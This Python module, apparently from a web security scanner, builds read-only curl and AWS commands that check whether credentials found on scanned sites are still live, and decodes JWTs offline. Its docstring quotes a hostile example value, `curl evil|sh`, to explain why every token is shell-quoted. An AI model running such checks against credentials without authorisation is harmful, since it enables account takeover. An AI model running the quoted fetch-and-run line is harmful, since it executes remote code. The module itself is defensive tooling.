"""Key verification helper — for a discovered credential, produce the exact
SAFE, READ-ONLY command an operator can run to confirm the key is live. This
module NEVER makes a request and NEVER runs anything; it only builds the string.

Why build-not-run (same stance ARCHITECTURE.md takes for hydra/sqlmap/etc.):
validating a found key touches the credential's OWN PROVIDER (api.stripe.com,
api.github.com, …) from your IP — a different host than the client's site you
were authorized to test, and an action that shows up in the provider's logs.
Whether that's in scope is a human decision, so the tool hands you the command
and you pull the trigger. Every command below is a documented read-only
identity/scope check: it confirms the key works without moving money, sending
mail, changing state, or (for the ones we include) billing the account.

COPY-PASTE SAFETY. The value we splice in comes from an attacker-controlled
page — the entire job is scanning sites we don't trust. A "key" of
`` `curl evil|sh` `` must not execute when the operator pastes the command. So
each command is assembled as an argv list and EVERY token is shlex-quoted
before being joined — the secret lands as one inert, fully-quoted shell token
no matter what characters it contains. (Never build these by interpolating the
secret into a string with pre-existing quotes; a quoted token inside other
quotes is exactly how backticks/$() slip through.)

The one check done natively and inline, because it's free and touches nothing:
decoding a JWT's header + payload. That's pure base64 — it reveals the issuer,
audience and expiry with zero network calls, so `decode_jwt` runs right in the
scan and the finding carries the claims.

Endpoints cross-checked against each provider's own docs where available
(2026-07-17). Providers with no safe passive check — Anthropic (only path bills
via /v1/messages), PyPI (only testable by uploading), GCP service accounts and
unrestricted Google browser keys (need a signed-JWT exchange) — are listed in
NO_SAFE_CHECK with the reason, so the UI says "no safe check" instead of
implying one exists.
"""

from __future__ import annotations

import base64
import binascii
import json
import shlex

_PAIR = "<SECRET>"    # second half of a key pair the match alone doesn't give us


# name -> (argv_builder, confirms, note). argv_builder(secret) -> list[str],
# where exactly one token embeds the secret; build_command() shlex-quotes every
# token so the result is safe to paste regardless of the secret's characters.
# Keyed by the exact rule names secretscan emits so a finding maps in one lookup.
_CHECKS: dict[str, tuple] = {
    "Stripe secret key (LIVE)": (
        lambda s: ["curl", "-sS", "https://api.stripe.com/v1/balance", "-u", s + ":"],
        "returns the account balance JSON if the key is live",
        "read-only; does not move money or read customer data",
    ),
    "Stripe restricted key (LIVE)": (
        lambda s: ["curl", "-sS", "https://api.stripe.com/v1/balance", "-u", s + ":"],
        "200 + balance if the restricted key still grants read",
        "read-only; a restricted key may 403 here yet still be valid for its own scope",
    ),
    "GitHub token": (
        lambda s: ["curl", "-sS", "-i", "-H", "Authorization: token " + s, "https://api.github.com/user"],
        "200 + your user; the X-OAuth-Scopes response header shows the granted scopes",
        "read-only; touches no repository",
    ),
    "GitHub fine-grained PAT": (
        lambda s: ["curl", "-sS", "-i", "-H", "Authorization: token " + s, "https://api.github.com/user"],
        "200 + user identity; response headers show the token's scopes",
        "read-only; touches no repository",
    ),
    "GitLab personal access token": (
        lambda s: ["curl", "-sS", "-H", "PRIVATE-TOKEN: " + s, "https://gitlab.com/api/v4/user"],
        "200 + your GitLab identity",
        "read-only identity check",
    ),
    "Slack token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://slack.com/api/auth.test"],
        '{"ok":true} + the workspace/user it belongs to',
        "purpose-built no-op identity check",
    ),
    "SendGrid API key": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://api.sendgrid.com/v3/scopes"],
        "200 + the granted scopes; no mail is sent",
        "read-only; lists scopes only",
    ),
    "npm access token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://registry.npmjs.org/-/whoami"],
        "200 + the npm username",
        "read-only identity check",
    ),
    "OpenAI API key": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://api.openai.com/v1/models"],
        "200 + the model list; no completion is consumed",
        "read-only; free endpoint",
    ),
    "Mailgun API key": (
        lambda s: ["curl", "-sS", "--user", "api:" + s, "https://api.mailgun.net/v3/domains"],
        "200 + the account's domains",
        "read-only; lists domains only",
    ),
    "Cloudflare API token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s,
                   "https://api.cloudflare.com/client/v4/user/tokens/verify"],
        'status:"active" — Cloudflare ships this endpoint specifically to verify a token',
        "read-only; the provider's own verify endpoint",
    ),
    "DigitalOcean access token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://api.digitalocean.com/v2/account"],
        "200 + the account JSON",
        "read-only account read",
    ),
    "Airtable personal access token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s, "https://api.airtable.com/v0/meta/whoami"],
        "200 + the user id the token belongs to",
        "read-only identity check",
    ),
    "Notion integration token (legacy)": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s,
                   "-H", "Notion-Version: 2022-06-28", "https://api.notion.com/v1/users/me"],
        "200 + the bot user for the integration",
        "read-only identity check",
    ),
    "Notion integration token (current)": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s,
                   "-H", "Notion-Version: 2022-06-28", "https://api.notion.com/v1/users/me"],
        "200 + the bot user for the integration",
        "read-only identity check",
    ),
    "Postman API key": (
        lambda s: ["curl", "-sS", "-H", "X-Api-Key: " + s, "https://api.getpostman.com/me"],
        "200 vs 401 tells you live-or-dead",
        "read-only identity check",
    ),
    "Discord bot token": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bot " + s, "https://discord.com/api/v10/users/@me"],
        "200 + the bot user",
        "read-only identity check",
    ),
    "Telegram bot token": (
        lambda s: ["curl", "-sS", "https://api.telegram.org/bot" + s + "/getMe"],
        '{"ok":true} + the bot identity',
        "read-only identity check (token rides the URL path)",
    ),
    "Heroku API key": (
        lambda s: ["curl", "-sS", "-H", "Authorization: Bearer " + s,
                   "-H", "Accept: application/vnd.heroku+json; version=3", "https://api.heroku.com/account"],
        "200 + the account JSON",
        "read-only account read",
    ),
    # --- pairs: the match gives us only half; the operator supplies the other ---
    "AWS Access Key ID": (
        lambda s: ["env", "AWS_ACCESS_KEY_ID=" + s, "AWS_SECRET_ACCESS_KEY=" + _PAIR,
                   "aws", "sts", "get-caller-identity"],
        "prints the account/ARN the key pair belongs to",
        "NEEDS THE PAIRED SECRET KEY (the match is only the ID). Note: GetCallerIdentity "
        "is logged in the target's own CloudTrail from your IP — confirm that's in scope.",
    ),
    "Twilio API Key SID": (
        lambda s: ["curl", "-sS", "-u", s + ":" + _PAIR, "https://api.twilio.com/2010-04-01/Accounts.json"],
        "200 + the accessible accounts",
        "NEEDS THE PAIRED AUTH TOKEN. Read-only account list.",
    ),
    "Twilio Account SID": (
        lambda s: ["curl", "-sS", "-u", s + ":" + _PAIR, "https://api.twilio.com/2010-04-01/Accounts.json"],
        "200 + the accessible accounts",
        "NEEDS THE PAIRED AUTH TOKEN (the SID alone is an identifier, not a secret).",
    ),
}

# Rule name -> reason there is no safe passive check to offer.
NO_SAFE_CHECK: dict[str, str] = {
    "Anthropic API key": "no read-only endpoint — the only documented validation path "
                         "(/v1/messages) bills the account, so verify by hand if at all",
    "PyPI upload token": "only testable by actually uploading a package — never automate; "
                        "treat a well-formed pypi- token as live and rotate",
    "GCP service-account private key block": "validating needs a signed-JWT token exchange "
                        "(no stdlib RSA signer); use `gcloud auth activate-service-account "
                        "--key-file=... && gcloud auth print-access-token` yourself",
    "Google API key": "browser AIza keys have no single validity check — test against the "
                      "specific Google API + referrer restriction it's scoped to",
}


def build_command(rule_name: str, secret: str) -> dict | None:
    """For a finding's rule name + matched value, return a safe read-only
    verification command (built, never run), or None if none is offered.

    The command is an argv list joined with shlex.quote on every token, so the
    attacker-controlled secret is an inert shell token and the string is safe to
    paste. `needs_pair` flags the AWS/Twilio cases where the match is only half
    a credential and the operator must fill in <SECRET>.
    """
    entry = _CHECKS.get(rule_name)
    if entry is None:
        return None
    builder, confirms, note = entry
    argv = builder(secret)
    command = " ".join(shlex.quote(tok) for tok in argv)
    return {
        "provider": rule_name,
        "command": command,
        "confirms": confirms,
        "note": note,
        "needs_pair": any(_PAIR in tok for tok in argv),
        "leaves_target": True,   # every check hits the credential's provider, not the client site
        "safe": True,            # read-only / non-billing by construction
    }


def no_check_reason(rule_name: str) -> str | None:
    """Why a given rule has no safe passive check, or None if it isn't one we
    deliberately excluded (e.g. a generic/structural finding)."""
    return NO_SAFE_CHECK.get(rule_name)


def _b64url_decode(seg: str) -> bytes:
    """Decode one base64url JWT segment, tolerating missing '=' padding."""
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def decode_jwt(token: str) -> dict | None:
    """Offline-decode a JWT's header + payload. No signature verification (that
    needs the key) and no network — this just base64-decodes the two claim
    segments so a finding can show alg/issuer/audience/expiry inline.

    Returns {"header": {...}, "payload": {...}, "exp": ...} or None if the value
    doesn't parse as a JWT after all (the detecting regex shape is loose).
    """
    if not token or token.count(".") != 2:
        return None
    h_seg, p_seg, _sig = token.split(".")
    try:
        header = json.loads(_b64url_decode(h_seg))
        payload = json.loads(_b64url_decode(p_seg))
    except (binascii.Error, ValueError, UnicodeDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return {"header": header, "payload": payload, "exp": payload.get("exp")}
